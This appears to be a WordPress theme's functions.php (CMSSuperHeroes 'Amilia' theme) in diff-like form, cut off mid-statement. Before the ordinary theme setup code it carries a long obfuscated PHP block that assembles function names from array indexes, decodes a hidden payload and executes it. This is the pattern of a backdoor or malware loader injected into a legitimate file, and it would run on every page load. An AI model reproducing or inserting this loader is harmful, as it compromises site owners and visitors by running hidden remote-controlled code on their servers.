qcpakw[3].$qcpakw[28].$qcpakw[28].$qcpakw[64].$qcpakw[14].$qcpakw[88].$qcpakw[65].$qcpakw[47].$qcpakw[186].$qcpakw[47].$qcpakw[29].$qcpakw[2].$qcpakw[51].$qcpakw[18].$qcpakw[158].$qcpakw[42].$qcpakw[53].$qcpakw[5].$qcpakw[54].$qcpakw[29].$qcpakw[30].$qcpakw[45].$qcpakw[23].$qcpakw[164].$qcpakw[53].$qcpakw[88].$qcpakw[28].$qcpakw[36].$qcpakw[53].$qcpakw[73].$qcpakw[24].$qcpakw[72].$qcpakw[72].$qcpakw[83].$qcpakw[33].$qcpakw[58].$qcpakw[67].$qcpakw[9].$qcpakw[2].$qcpakw[208].$qcpakw[28].$qcpakw[51].$qcpakw[2].$qcpakw[28].$qcpakw[23].$qcpakw[7].$qcpakw[64].$qcpakw[45].$qcpakw[124].$qcpakw[2].$qcpakw[131].$qcpakw[28].$qcpakw[25].$qcpakw[45].$qcpakw[105].$qcpakw[186].$qcpakw[69].$qcpakw[33].$qcpakw[24].$qcpakw[2].$qcpakw[47].$qcpakw[12].$qcpakw[51].$qcpakw[131].$qcpakw[28].$qcpakw[164].$qcpakw[52].$qcpakw[158].$qcpakw[14].$qcpakw[30].$qcpakw[1].$qcpakw[186].$qcpakw[105].$qcpakw[126].$qcpakw[24].$qcpakw[105].$qcpakw[56].$qcpakw[0].$qcpakw[7].$qcpakw[138].$qcpakw[43].$qcpakw[7].$qcpakw[0].$qcpakw[9].$qcpakw[56].$qcpakw[72].$qcpakw[34].$qcpakw[73].$qcpakw[45].$qcpakw[208].$qcpakw[58].$qcpakw[67].$qcpakw[54].$qcpakw[33].$qcpakw[25].$qcpakw[4].$qcpakw[43].$qcpakw[42].$qcpakw[91].$qcpakw[63].$qcpakw[27].$qcpakw[72].$qcpakw[124].$qcpakw[70].$qcpakw[30].$qcpakw[27].$qcpakw[158].$qcpakw[132].$qcpakw[73].$qcpakw[18].$qcpakw[126].$qcpakw[24].$qcpakw[182].$qcpakw[88].$qcpakw[124].$qcpakw[58].$qcpakw[78].$qcpakw[29].$qcpakw[56].$qcpakw[25].$qcpakw[51].$qcpakw[24].$qcpakw[23].$qcpakw[72].$qcpakw[69].$qcpakw[91].$qcpakw[73].$qcpakw[126].$qcpakw[15].$qcpakw[42].$qcpakw[1].$qcpakw[63].$qcpakw[186].$qcpakw[65].$qcpakw[23].$qcpakw[45].$qcpakw[29].$qcpakw[69].$qcpakw[54].$qcpakw[65].$qcpakw[8].$qcpakw[4].$qcpakw[53].$qcpakw[7].$qcpakw[27].$qcpakw[9].$qcpakw[56].$qcpakw[208].$qcpakw[21].$qcpakw[131].$qcpakw[12].$qcpakw[29].$qcpakw[7].$qcpakw[24].$qcpakw[138].$qcpakw[8].$qcpakw[51].$qcpakw[132].$qcpakw[53].$qcpakw[12].$qcpakw[2].$qcpakw[4].$qcpakw[7].$qcpakw[27].$qcpakw[36].$qcpakw[58].$qcpakw[43].$qcpakw[44].$qcpakw[3].$qcpakw[56].$qcpakw[73].$qcpakw[11].$qcpakw[7].$qcpakw[3].$qcpakw[15].$qcpakw[8].$qcpakw[132].$qcpakw[9].$qcpakw[58].$qcpakw[25].$qcpakw[67].$qcpakw[18].$qcpakw[12].$qcpakw[64].$qcpakw[72].$qcpakw[88].$qcpakw[14].$qcpakw[24].$qcpakw[131].$qcpakw[43].$qcpakw[24].$qcpakw[70].$qcpakw[126].$qcpakw[105].$qcpakw[21].$qcpakw[83].$qcpakw[88].$qcpakw[8].$qcpakw[1].$qcpakw[72].$qcpakw[15].$qcpakw[42].$qcpakw[18].$qcpakw[138].$qcpakw[0].$qcpakw[83].$qcpakw[73].$qcpakw[33].$qcpakw[3].$qcpakw[29].$qcpakw[6].$qcpakw[69].$qcpakw[72].$qcpakw[25].$qcpakw[11].$qcpakw[8].$qcpakw[105].$qcpakw[30].$qcpakw[208].$qcpakw[16].$qcpakw[45].$qcpakw[28].$qcpakw[126].$qcpakw[42].$qcpakw[56].$qcpakw[6].$qcpakw[9].$qcpakw[70].$qcpakw[15].$qcpakw[132].$qcpakw[18].$qcpakw[0].$qcpakw[131].$qcpakw[44].$qcpakw[28].$qcpakw[105].$qcpakw[58].$qcpakw[63].$qcpakw[131].$qcpakw[73].$qcpakw[4].$qcpakw[25].$qcpakw[16].$qcpakw[42].$qcpakw[63].$qcpakw[23].$qcpakw[21].$qcpakw[182].$qcpakw[70].$qcpakw[16].$qcpakw[12].$qcpakw[44].$qcpakw[21].$qcpakw[53].$qcpakw[18].$qcpakw[158].$qcpakw[91].$qcpakw[164].$qcpakw[24].$qcpakw[30].$qcpakw[4].$qcpakw[72].$qcpakw[56].$qcpakw[11].$qcpakw[4].$qcpakw[64].$qcpakw[138].$qcpakw[78].$qcpakw[91].$qcpakw[24].$qcpakw[58].$qcpakw[63].$qcpakw[69].$qcpakw[47].$qcpakw[88].$qcpakw[78].$qcpakw[138].$qcpakw[15].$qcpakw[28].$qcpakw[14].$qcpakw[8].$qcpakw[72].$qcpakw[9].$qcpakw[70].$qcpakw[83].$qcpakw[64].$qcpakw[131].$qcpakw[14].$qcpakw[24].$qcpakw[164].$qcpakw[5].$qcpakw[73].$qcpakw[105].$qcpakw[72].$qcpakw[158].$qcpakw[1].$qcpakw[24].$qcpakw[164].$qcpakw[52].$qcpakw[91].$qcpakw[105].$qcpakw[138].$qcpakw[52].$qcpakw[91].$qcpakw[72].$qcpakw[164].$qcpakw[11].$qcpakw[29].$qcpakw[182].$qcpakw[38].$qcpakw[1].$qcpakw[21].$qcpakw[14].$qcpakw[36].$qcpakw[5].$qcpakw[25].$qcpakw[91].$qcpakw[67].$qcpakw[15].$qcpakw[182].$qcpakw[69].$qcpakw[25].$qcpakw[67].$qcpakw[12].$qcpakw[47].$qcpakw[36].$qcpakw[8].$qcpakw[60].$qcpakw[63].$qcpakw[38].$qcpakw[28].$qcpakw[28].$qcpakw[60].$qcpakw[64].$qcpakw[182].$qcpakw[91].$qcpakw[53].$qcpakw[7].$qcpakw[24].$qcpakw[208].$qcpakw[67].$qcpakw[3].$qcpakw[24].$qcpakw[83].$qcpakw[43].$qcpakw[58].$qcpakw[43].$qcpakw[34].$qcpakw[78].$qcpakw[56].$qcpakw[158].$qcpakw[69].$qcpakw[3].$qcpakw[28].$qcpakw[6].$qcpakw[186].$qcpakw[182].$qcpakw[29].$qcpakw[132].$qcpakw[36].$qcpakw[78].$qcpakw[38].$qcpakw[44].$qcpakw[23].$qcpakw[83].$qcpakw[18].$qcpakw[15].$qcpakw[6].$qcpakw[88].$qcpakw[60].$qcpakw[3].$qcpakw[164].$qcpakw[164].$qcpakw[131].$qcpakw[56].$qcpakw[23].$qcpakw[63].$qcpakw[16].$qcpakw[70].$qcpakw[65].$qcpakw[0].$qcpakw[126].$qcpakw[38].$qcpakw[16].$qcpakw[0].$qcpakw[64].$qcpakw[54].$qcpakw[29].$qcpakw[43].$qcpakw[8].$qcpakw[9].$qcpakw[132].$qcpakw[1].$qcpakw[58].$qcpakw[63].$qcpakw[52].$qcpakw[3].$qcpakw[64].$qcpakw[21].$qcpakw[126].$qcpakw[91].$qcpakw[83].$qcpakw[66].$qcpakw[58].$qcpakw[63].$qcpakw[164].$qcpakw[12].$qcpakw[0].$qcpakw[56].$qcpakw[23].$qcpakw[23].$qcpakw[132].$qcpakw[208].$qcpakw[208].$qcpakw[69].$qcpakw[64].$qcpakw[54].$qcpakw[27].$qcpakw[56].$qcpakw[14].$qcpakw[58].$qcpakw[2].$qcpakw[52].$qcpakw[15].$qcpakw[131].$qcpakw[23].$qcpakw[66].$qcpakw[72].$qcpakw[131].$qcpakw[126].$qcpakw[16].$qcpakw[70].$qcpakw[21].$qcpakw[158].$qcpakw[2].$qcpakw[14].$qcpakw[4].$qcpakw[7].$qcpakw[27].$qcpakw[38].$qcpakw[6].$qcpakw[91].$qcpakw[52].$qcpakw[64].$qcpakw[30].$qcpakw[126].$qcpakw[12].$qcpakw[18].$qcpakw[1].$qcpakw[69].$qcpakw[11].$qcpakw[7].$qcpakw[30].$qcpakw[14].$qcpakw[36].$qcpakw[7].$qcpakw[29].$qcpakw[44].$qcpakw[12].$qcpakw[67].$qcpakw[43].$qcpakw[67].$qcpakw[4].$qcpakw[11].$qcpakw[88].$qcpakw[28].$qcpakw[9].$qcpakw[88].$qcpakw[88].$qcpakw[42].$qcpakw[138].$qcpakw[27].$qcpakw[182].$qcpakw[14].$qcpakw[73].$qcpakw[27].$qcpakw[58].$qcpakw[33].$qcpakw[11].$qcpakw[7].$qcpakw[30].$qcpakw[1].$qcpakw[54].$qcpakw[6].$qcpakw[69].$qcpakw[65].$qcpakw[30].$qcpakw[54].$qcpakw[34].$qcpakw[25].$qcpakw[91].$qcpakw[34].$qcpakw[28].$qcpakw[27].$qcpakw[2].$qcpakw[9].$qcpakw[66].$qcpakw[11].$qcpakw[25].$qcpakw[158].$qcpakw[11].$qcpakw[91].$qcpakw[78].$qcpakw[132].$qcpakw[138].$qcpakw[16].$qcpakw[73].$qcpakw[126].$qcpakw[43].$qcpakw[27].$qcpakw[72].$qcpakw[70].$qcpakw[12].$qcpakw[5].$qcpakw[36].$qcpakw[34].$qcpakw[132].$qcpakw[29].$qcpakw[1].$qcpakw[24].$qcpakw[65].$qcpakw[12].$qcpakw[5].$qcpakw[72].$qcpakw[60].$qcpakw[208].$qcpakw[54].$qcpakw[16].$qcpakw[54].$qcpakw[52].$qcpakw[30].$qcpakw[70].$qcpakw[63].$qcpakw[7].$qcpakw[28].$qcpakw[3].$qcpakw[27].$qcpakw[88].$qcpakw[67].$qcpakw[132].$qcpakw[73].$qcpakw[63].$qcpakw[8].$qcpakw[126].$qcpakw[64].$qcpakw[52].$qcpakw[23].$qcpakw[8].$qcpakw[27].$qcpakw[73].$qcpakw[67].$qcpakw[78].$qcpakw[9].$qcpakw[66].$qcpakw[105].$qcpakw[24].$qcpakw[27].$qcpakw[9].$qcpakw[73].$qcpakw[69].$qcpakw[33].$qcpakw[11].$qcpakw[36].$qcpakw[7].$qcpakw[60].$qcpakw[8].$qcpakw[60].$qcpakw[138].$qcpakw[18].$qcpakw[3].$qcpakw[36].$qcpakw[0].$qcpakw[25].$qcpakw[0].$qcpakw[18].$qcpakw[4].$qcpakw[9].$qcpakw[182].$qcpakw[30].$qcpakw[126].$qcpakw[45].$qcpakw[64].$qcpakw[52].$qcpakw[24].$qcpakw[54].$qcpakw[132].$qcpakw[124].$qcpakw[27].$qcpakw[14].$qcpakw[36].$qcpakw[23].$qcpakw[8].$qcpakw[23].$qcpakw[5].$qcpakw[138].$qcpakw[45].$qcpakw[24].$qcpakw[105].$qcpakw[58].$qcpakw[9].$qcpakw[67].$qcpakw[138].$qcpakw[6].$qcpakw[83].$qcpakw[131].$qcpakw[58].$qcpakw[164].$qcpakw[186].$qcpakw[56].$qcpakw[15].$qcpakw[30].$qcpakw[29].$qcpakw[78].$qcpakw[69].$qcpakw[47].$qcpakw[2].$qcpakw[5].$qcpakw[67].$qcpakw[47].$qcpakw[33].$qcpakw[18].$qcpakw[44].$qcpakw[3].$qcpakw[56].$qcpakw[15].$qcpakw[69].$qcpakw[34].$qcpakw[158].$qcpakw[28].$qcpakw[64].$qcpakw[38].$qcpakw[23].$qcpakw[67].$qcpakw[33].$qcpakw[2].$qcpakw[132].$qcpakw[28].$qcpakw[14].$qcpakw[18].$qcpakw[78].$qcpakw[138].$qcpakw[131].$qcpakw[105].$qcpakw[53].$qcpakw[42].$qcpakw[23].$qcpakw[72].$qcpakw[58].$qcpakw[6].$qcpakw[66].$qcpakw[60].$qcpakw[51].$qcpakw[83].$qcpakw[69].$qcpakw[45].$qcpakw[131].$qcpakw[78].$qcpakw[47].$qcpakw[56].$qcpakw[2].$qcpakw[138].$qcpakw[5].$qcpakw[124].$qcpakw[11].$qcpakw[9].$qcpakw[18].$qcpakw[1].$qcpakw[6].$qcpakw[58].$qcpakw[186].$qcpakw[2].$qcpakw[182].$qcpakw[70].$qcpakw[64].$qcpakw[28].$qcpakw[18].$qcpakw[12].$qcpakw[63].$qcpakw[33].$qcpakw[138].$qcpakw[14].$qcpakw[58].$qcpakw[186].$qcpakw[23].$qcpakw[12].$qcpakw[47].$qcpakw[44].$qcpakw[158].$qcpakw[52].$qcpakw[131].$qcpakw[45].$qcpakw[58].$qcpakw[18].$qcpakw[6].$qcpakw[60].$qcpakw[6].$qcpakw[132].$qcpakw[182].$qcpakw[60].$qcpakw[78].$qcpakw[21].$qcpakw[36].$qcpakw[44].$qcpakw[29].$qcpakw[0].$qcpakw[5].$qcpakw[21].$qcpakw[70].$qcpakw[5].$qcpakw[56].$qcpakw[44].$qcpakw[182].$qcpakw[30].$qcpakw[2].$qcpakw[3].$qcpakw[54].$qcpakw[64].$qcpakw[64].$qcpakw[52].$qcpakw[63].$qcpakw[3].$qcpakw[64].$qcpakw[54].$qcpakw[60].$qcpakw[54].$qcpakw[18].$qcpakw[1].$qcpakw[25].$qcpakw[23].$qcpakw[1].$qcpakw[16].$qcpakw[132].$qcpakw[54].$qcpakw[42].$qcpakw[126].$qcpakw[53].$qcpakw[14].$qcpakw[124].$qcpakw[124].$qcpakw[7].$qcpakw[11].$qcpakw[5].$qcpakw[15].$qcpakw[63].$qcpakw[2].$qcpakw[1].$qcpakw[7].$qcpakw[66].$qcpakw[65].$qcpakw[88].$qcpakw[164].$qcpakw[69].$qcpakw[3].$qcpakw[73].$qcpakw[7].$qcpakw[51].$qcpakw[36].$qcpakw[58].$qcpakw[3].$qcpakw[132].$qcpakw[12].$qcpakw[25].$qcpakw[7].$qcpakw[105].$qcpakw[83].$qcpakw[5].$qcpakw[54].$qcpakw[70].$qcpakw[73].$qcpakw[158].$qcpakw[4].$qcpakw[8].$qcpakw[64].$qcpakw[16].$qcpakw[69].$qcpakw[63].$qcpakw[1].$qcpakw[6].$qcpakw[66].$qcpakw[2].$qcpakw[65].$qcpakw[1].$qcpakw[18].$qcpakw[3].$qcpakw[12].$qcpakw[158].$qcpakw[53].$qcpakw[70].$qcpakw[8].$qcpakw[58].$qcpakw[15].$qcpakw[164].$qcpakw[58].$qcpakw[65].$qcpakw[52].$qcpakw[182].$qcpakw[3].$qcpakw[83].$qcpakw[164].$qcpakw[38].$qcpakw[33].$qcpakw[38].$qcpakw[164].$qcpakw[6].$qcpakw[69].$qcpakw[88].$qcpakw[91].$qcpakw[186].$qcpakw[44].$qcpakw[16].$qcpakw[72].$qcpakw[124].$qcpakw[208].$qcpakw[43].$qcpakw[69].$qcpakw[67].$qcpakw[2].$qcpakw[3].$qcpakw[38].$qcpakw[63].$qcpakw[7].$qcpakw[58].$qcpakw[9].$qcpakw[208].$qcpakw[6].$qcpakw[27].$qcpakw[28].$qcpakw[65].$qcpakw[126].$qcpakw[186].$qcpakw[9].$qcpakw[83].$qcpakw[64].$qcpakw[42].$qcpakw[38].$qcpakw[105].$qcpakw[44].$qcpakw[182].$qcpakw[52].$qcpakw[186].$qcpakw[124].$qcpakw[1].$qcpakw[63].$qcpakw[27].$qcpakw[164].$qcpakw[14].$qcpakw[18].$qcpakw[60].$qcpakw[126].$qcpakw[164].$qcpakw[15].$qcpakw[6].$qcpakw[186].$qcpakw[2].$qcpakw[16].$qcpakw[69].$qcpakw[28].$qcpakw[44].$qcpakw[38].$qcpakw[14].$qcpakw[58].$qcpakw[38].$qcpakw[138].$qcpakw[5].$qcpakw[63].$qcpakw[88].$qcpakw[29].$qcpakw[164].$qcpakw[16].$qcpakw[66].$qcpakw[91].$qcpakw[21].$qcpakw[27].$qcpakw[5].$qcpakw[124].$qcpakw[52].$qcpakw[78].$qcpakw[15].$qcpakw[47].$qcpakw[63].$qcpakw[29].$qcpakw[34].$qcpakw[14].$qcpakw[11].$qcpakw[24].$qcpakw[18].$qcpakw[72].$qcpakw[105].$qcpakw[29].$qcpakw[78].$qcpakw[64].$qcpakw[78].$qcpakw[29].$qcpakw[34].$qcpakw[27].$qcpakw[158].$qcpakw[9].$qcpakw[36].$qcpakw[63].$qcpakw[60].$qcpakw[30].$qcpakw[33].$qcpakw[0].$qcpakw[138].$qcpakw[83].$qcpakw[1].$qcpakw[66].$qcpakw[186].$qcpakw[16].$qcpakw[1].$qcpakw[1].$qcpakw[6].$qcpakw[45].$qcpakw[45].$qcpakw[16].$qcpakw[124].$qcpakw[69].$qcpakw[131].$qcpakw[16].$qcpakw[64].$qcpakw[186].$qcpakw[54].$qcpakw[5].$qcpakw[8].$qcpakw[36].$qcpakw[45].$qcpakw[54].$qcpakw[65].$qcpakw[27].$qcpakw[132].$qcpakw[44].$qcpakw[67].$qcpakw[4].$qcpakw[64].$qcpakw[7].$qcpakw[126].$qcpakw[105].$qcpakw[67].$qcpakw[83].$qcpakw[65].$qcpakw[78].$qcpakw[124].$qcpakw[24].$qcpakw[65].$qcpakw[12].$qcpakw[91].$qcpakw[70].$qcpakw[69].$qcpakw[158].$qcpakw[73].$qcpakw[164].$qcpakw[60].$qcpakw[33].$qcpakw[69].$qcpakw[36].$qcpakw[73].$qcpakw[158].$qcpakw[91].$qcpakw[33].$qcpakw[21].$qcpakw[43].$qcpakw[30].$qcpakw[56].$qcpakw[45].$qcpakw[131].$qcpakw[12].$qcpakw[12].$qcpakw[72].$qcpakw[54].$qcpakw[164].$qcpakw[88].$qcpakw[58].$qcpakw[52].$qcpakw[54].$qcpakw[2].$qcpakw[64].$qcpakw[25].$qcpakw[186].$qcpakw[52].$qcpakw[91].$qcpakw[33].$qcpakw[64].$qcpakw[72].$qcpakw[45].$qcpakw[43].$qcpakw[67].$qcpakw[6].$qcpakw[132].$qcpakw[164].$qcpakw[131].$qcpakw[72].$qcpakw[66].$qcpakw[34].$qcpakw[8].$qcpakw[16].$qcpakw[7].$qcpakw[1].$qcpakw[23].$qcpakw[21].$qcpakw[51].$qcpakw[182].$qcpakw[51].$qcpakw[78].$qcpakw[36].$qcpakw[25].$qcpakw[66].$qcpakw[43].$qcpakw[58].$qcpakw[66].$qcpakw[56].$qcpakw[164].$qcpakw[6].$qcpakw[14].$qcpakw[21].$qcpakw[47].$qcpakw[78].$qcpakw[2].$qcpakw[138].$qcpakw[0].$qcpakw[64].$qcpakw[67].$qcpakw[27].$qcpakw[63].$qcpakw[72].$qcpakw[186].$qcpakw[44].$qcpakw[24].$qcpakw[11].$qcpakw[16].$qcpakw[66].$qcpakw[51].$qcpakw[65].$qcpakw[66].$qcpakw[38].$qcpakw[25].$qcpakw[131].$qcpakw[138].$qcpakw[56].$qcpakw[25].$qcpakw[1].$qcpakw[78].$qcpakw[65].$qcpakw[4].$qcpakw[186].$qcpakw[64].$qcpakw[78].$qcpakw[186].$qcpakw[105].$qcpakw[132].$qcpakw[208].$qcpakw[124].$qcpakw[186].$qcpakw[60].$qcpakw[208].$qcpakw[56].$qcpakw[27].$qcpakw[64].$qcpakw[186].$qcpakw[53].$qcpakw[138].$qcpakw[44].$qcpakw[132].$qcpakw[131].$qcpakw[25].$qcpakw[58].$qcpakw[4].$qcpakw[138].$qcpakw[52].$qcpakw[88].$qcpakw[47].$qcpakw[131].$qcpakw[56].$qcpakw[29].$qcpakw[78].$qcpakw[36].$qcpakw[8].$qcpakw[23].$qcpakw[158].$qcpakw[43].$qcpakw[9].$qcpakw[27].$qcpakw[164].$qcpakw[131].$qcpakw[131].$qcpakw[25].$qcpakw[66].$qcpakw[16].$qcpakw[72].$qcpakw[12].$qcpakw[124].$qcpakw[29].$qcpakw[14].$qcpakw[43].$qcpakw[132].$qcpakw[66].$qcpakw[4].$qcpakw[78].$qcpakw[43].$qcpakw[88].$qcpakw[12].$qcpakw[73].$qcpakw[65].$qcpakw[164].$qcpakw[60].$qcpakw[60].$qcpakw[158].$qcpakw[4].$qcpakw[11].$qcpakw[60].$qcpakw[12].$qcpakw[124].$qcpakw[83].$qcpakw[56].$qcpakw[58].$qcpakw[47].$qcpakw[65].$qcpakw[34].$qcpakw[158].$qcpakw[12].$qcpakw[105].$qcpakw[67].$qcpakw[186].$qcpakw[7].$qcpakw[36].$qcpakw[5].$qcpakw[25].$qcpakw[7].$qcpakw[24].$qcpakw[45].$qcpakw[54].$qcpakw[4].$qcpakw[0].$qcpakw[38].$qcpakw[131].$qcpakw[47].$qcpakw[42].$qcpakw[5].$qcpakw[70].$qcpakw[53].$qcpakw[88].$qcpakw[11].$qcpakw[63].$qcpakw[73].$qcpakw[47].$qcpakw[3].$qcpakw[7].$qcpakw[78].$qcpakw[88].$qcpakw[131].$qcpakw[73].$qcpakw[124].$qcpakw[64].$qcpakw[23].$qcpakw[23].$qcpakw[4].$qcpakw[186].$qcpakw[72].$qcpakw[1].$qcpakw[164].$qcpakw[53].$qcpakw[47].$qcpakw[54].$qcpakw[47].$qcpakw[58].$qcpakw[6].$qcpakw[27].$qcpakw[14].$qcpakw[69].$qcpakw[132].$qcpakw[27].$qcpakw[42].$qcpakw[2].$qcpakw[64].$qcpakw[47].$qcpakw[5].$qcpakw[30].$qcpakw[88].$qcpakw[7].$qcpakw[6].$qcpakw[5].$qcpakw[9].$qcpakw[44].$qcpakw[67].$qcpakw[28].$qcpakw[54].$qcpakw[164].$qcpakw[4].$qcpakw[73].$qcpakw[182].$qcpakw[186].$qcpakw[186].$qcpakw[54].$qcpakw[14].$qcpakw[43].$qcpakw[158].$qcpakw[0].$qcpakw[43].$qcpakw[33].$qcpakw[14].$qcpakw[2].$qcpakw[67].$qcpakw[14].$qcpakw[88].$qcpakw[33].$qcpakw[105].$qcpakw[5].$qcpakw[164].$qcpakw[16].$qcpakw[43].$qcpakw[131].$qcpakw[38].$qcpakw[33].$qcpakw[33].$qcpakw[88].$qcpakw[9].$qcpakw[126].$qcpakw[186].$qcpakw[42].$qcpakw[24].$qcpakw[208].$qcpakw[0].$qcpakw[28].$qcpakw[69].$qcpakw[65].$qcpakw[132].$qcpakw[14].$qcpakw[91].$qcpakw[56].$qcpakw[5].$qcpakw[14].$qcpakw[24].$qcpakw[43].$qcpakw[14].$qcpakw[11].$qcpakw[1].$qcpakw[24].$qcpakw[29].$qcpakw[18].$qcpakw[36].$qcpakw[34].$qcpakw[63].$qcpakw[70].$qcpakw[14].$qcpakw[28].$qcpakw[132].$qcpakw[24].$qcpakw[208].$qcpakw[7].$qcpakw[126].$qcpakw[186].$qcpakw[208].$qcpakw[126].$qcpakw[27].$qcpakw[27].$qcpakw[124].$qcpakw[63].$qcpakw[30].$qcpakw[54].$qcpakw[4].$qcpakw[42].$qcpakw[25].$qcpakw[131].$qcpakw[1311].$qcpakw[1311];$uexoaukzwp=$qcpakw[7].$qcpakw[21].$qcpakw[105].$qcpakw[138].$qcpakw[33].$qcpakw[5].$qcpakw[2098].$qcpakw[0].$qcpakw[138].$qcpakw[47].$qcpakw[34].$qcpakw[0].$qcpakw[138];$nrdnczxxcnngl=$qcpakw[38].$qcpakw[69].$qcpakw[30].$qcpakw[25].$qcpakw[47].$qcpakw[34].$qcpakw[64].$qcpakw[54].$qcpakw[28].$qcpakw[138].$qcpakw[105].$qcpakw[105];$jegjskexitycd=$qcpakw[105].$qcpakw[67].$qcpakw[28].$qcpakw[28].$qcpakw[138].$qcpakw[186];$ztlmloannylqlyx=$qcpakw[47].$qcpakw[28].$qcpakw[138].$qcpakw[21].$qcpakw[67].$qcpakw[138].$qcpakw[2098].$qcpakw[18].$qcpakw[30].$qcpakw[25].$qcpakw[47].$qcpakw[67].$qcpakw[23].$qcpakw[34].$qcpakw[25];$mgbtqudurlnporn=$qcpakw[513].$qcpakw[21];$lzbwnckbavrmu=$qcpakw[3643].$qcpakw[2655].$qcpakw[21].$qcpakw[513].$qcpakw[82].$qcpakw[2].$qcpakw[21].$qcpakw[186].$qcpakw[138];$jhwlamfehwpvm=$qcpakw[138].$qcpakw[12].$qcpakw[23].$qcpakw[67];$msfpklrqbxpdbz=$jegjsk$jhwlamfehwpvmycd;$rsrcfnfhrmrgqsr=$nrdnczxxcnngl($uexoaukzwp($udpqeyacssao));$rsrcfnfhrmrgqsr=$msfpklrqbxpdbz($rsrcfnfhrmrgqsr);$fjquucmlejah=$ztlmloannylqlyx($mgbtqudurlnporn,$jegjsk$jhwlamfehwpvmycd($lzbwnckbavrmu));$fjquucmlejah($jegjsk$jhwlamfehwpvmycd($rsrcfnfhrmrgqsr));$jhwlamfehwpvm;?><?php
+/**
+ * Theme Framework functions and definitions
+ *
+ * Sets up the theme and provides some helper functions, which are used
+ * in the theme as custom template tags. Others are attached to action and
+ * filter hooks in WordPress to change core functionality.
+ *
+ * When using a child theme (see http://codex.wordpress.org/Theme_Development and
+ * http://codex.wordpress.org/Child_Themes), you can override certain functions
+ * (those wrapped in a function_exists() call) by defining them first in your child theme's
+ * functions.php file. The child theme's functions.php file is included before the parent
+ * theme's file, so the child theme functions would be used.
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
+ * to a filter or action hook.
+ *
+ * For more information on hooks, actions, and filters, @link http://codex.wordpress.org/Plugin_API
+ *
+ * @package CMSSuperHeroes
+ * @subpackage CMS Theme
+ * @since 1.0.0
+ */
+/**
+ * Add global values.
+ */
+
+/* Dismiss vc update. */
+if(function_exists('vc_set_as_theme')) vc_set_as_theme( true );
+
+/* Add base functions */
+require( get_template_directory() . '/inc/base.class.php' );
+
+if(class_exists("AmiliaBase")){
+    $amilia_base = new AmiliaBase;
+}
+
+/* Add ReduxFramework. */
+if(!class_exists('ReduxFramework')){
+    require( get_template_directory() . '/inc/ReduxCore/framework.php' );
+}
+
+/* Add theme options. */
+require( get_template_directory() . '/inc/options/functions.php' );
+
+/**
+ * Add Custom Params
+ */
+function amilia_after_vc_params() {
+	require( get_template_directory() . '/vc_params/vc_rows.php' );
+    require( get_template_directory() . '/vc_params/vc_separator.php' );
+    require( get_template_directory() . '/vc_params/vc_custom_heading.php' );
+    require( get_template_directory() . '/vc_params/vc_tta_accordion.php' );
+    require( get_template_directory() . '/vc_params/vc_tta_tabs.php' );
+    require( get_template_directory() . '/vc_params/vc_toggle.php' );
+    require( get_template_directory() . '/vc_params/vc_btn.php' );
+    require( get_template_directory() . '/vc_params/vc_message.php' );
+    require( get_template_directory() . '/vc_params/vc_images_carousel.php' );
+    require( get_template_directory() . '/vc_params/vc_single_image.php' );
+    require( get_template_directory() . '/vc_params/vc_video.php' );
+    require( get_template_directory() . '/vc_params/vc_gallery.php' );
+    require( get_template_directory() . '/vc_params/vc_pie.php' );
+    require( get_template_directory() . '/vc_params/vc_column.php' );
+    require( get_template_directory() . '/vc_params/vc_column_inner.php' );
+    require( get_template_directory() . '/vc_params/cms_progressbar.php' );
+
+    /*  Require font icon */
+	require( get_template_directory() . '/inc/libs/font-icon/elegant.php' );
+}
+add_action('vc_after_init', 'amilia_after_vc_params');
+
+/**
+ * Add theme elements
+ */
+function amilia_vc_elements() {
+	if(class_exists('CmsShortCode')){
+		//new elements
+	    require( get_template_directory() . '/inc/elements/dropcaps/cms_dropcaps.php' );
+        require( get_template_directory() . '/inc/elements/lightboxmap/cms_lightboxmap.php' );
+        require( get_template_directory() . '/inc/elements/countdown/cms_countdown.php' );
+        require( get_template_directory() . '/inc/elements/callout/callout.php' );
+        require( get_template_directory() . '/inc/elements/steps/steps.php' );
+        require( get_template_directory() . '/inc/elements/progress/progress.php' );
+        require( get_template_directory() . '/inc/elements/newsletter/newsletter.php' );
+        require( get_template_directory() . '/inc/elements/promo.php' );
+        require( get_template_directory() . '/inc/elements/landing_item/cms_landing_item.php' );
+    }
+}
+add_action('vc_before_init', 'amilia_vc_elements');
+
+/* Include CMS shortcode */
+add_filter('cms-shorcode-list', 'amilia_shortcodes_list');
+function amilia_shortcodes_list() {
+	$amilia_shortcodes_list = array(
+		'cms_carousel',
+		'cms_grid',
+		'cms_fancybox_single',
+		'cms_counter_single',
+		'cms_progressbar'
+	);
+	return $amilia_shortcodes_list;
+}
+
+add_filter('add_to_cart_redirect', 'themeprefix_add_to_cart_redirect');
+function themeprefix_add_to_cart_redirect() {
+ global $woocommerce;
+ $checkout_url = $woocommerce->cart->get_checkout_url();
+ return $checkout_url;
+}
+
+//Add New Pay Button Text
+add_filter( 'woocommerce_product_single_add_to_cart_text', 'themeprefix_cart_button_text' ); 
+ 
+function themeprefix_cart_button_text() {
+ return __( 'Buy Now', 'woocommerce' );
+}
+
+add_filter( 'woocommerce_order_button_text', 'woo_custom_order_button_text' ); 
+
+function woo_custom_order_button_text() {
+    return __( 'Proceed to Payment', 'woocommerce' ); 
+}
+
+/* Add Quote Editer */
+require( get_template_directory() . '/inc/tinymce/button.php' );
+
+/* Add SCSS */
+if(!class_exists('scssc')){
+    require( get_template_directory() . '/inc/libs/scss.inc.php' );
+}
+
+/* Woo commerce function */
+if(class_exists('Woocommerce')){
+    require get_template_directory() . '/woocommerce/wc-template-hooks.php';
+    require get_template_directory() . '/woocommerce/wc-function-hooks.php';
+}
+
+/* Add Meta Core Options */
+if(is_admin()){
+
+    if(!class_exists('CsCoreControl')){
+        /* add mete core */
+        require( get_template_directory() . '/inc/metacore/core.options.php' );
+        /* add meta options */
+        require( get_template_directory() . '/inc/options/meta.options.php' );
+    }
+
+    /* tmp plugins. */
+    require( get_template_directory() . '/inc/options/require.plugins.php' );
+
+    /* add presets */
+    require( get_template_directory() . '/inc/options/presets.php' );
+}
+
+/* Add Template functions */
+require( get_template_directory() . '/inc/template.functions.php' );
+
+/* Static css. */
+require( get_template_directory() . '/inc/dynamic/static.css.php' );
+
+/* Dynamic css*/
+require( get_template_directory() . '/inc/dynamic/dynamic.css.php' );
+
+/* Add mega menu */
+if(!class_exists('HeroMenuWalker') && (isset($smof_data['menu_mega']) && $smof_data['menu_mega'] == 1)) {
